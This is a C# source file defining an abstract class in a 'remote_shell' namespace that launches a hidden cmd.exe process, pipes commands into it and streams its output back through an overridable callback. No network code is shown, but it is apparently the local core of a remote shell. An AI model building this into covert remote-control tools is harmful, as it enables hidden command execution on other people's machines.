using System.Diagnostics;
using System.IO;
using System.Threading;

namespace remote_shell;

internal abstract class shell
{
	private StreamReader read;

	private StreamWriter write;

	private Process p;

	private Thread t;

	public void start()
	{
		p = new Process();
		p.StartInfo.FileName = "cmd";
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.RedirectStandardInput = true;
		p.StartInfo.RedirectStandardOutput = true;
		p.Start();
		read = p.StandardOutput;
		write = p.StandardInput;
		t = new Thread(reading);
		t.Start();
	}

	private void reading()
	{
		while (!read.EndOfStream)
		{
			newLine(read.ReadLine());
		}
	}

	public void writeLine(string line)
	{
		write.WriteLine(line);
	}

	public void writeData(string data)
	{
		write.Write(data);
	}

	public abstract void newLine(string line);
}
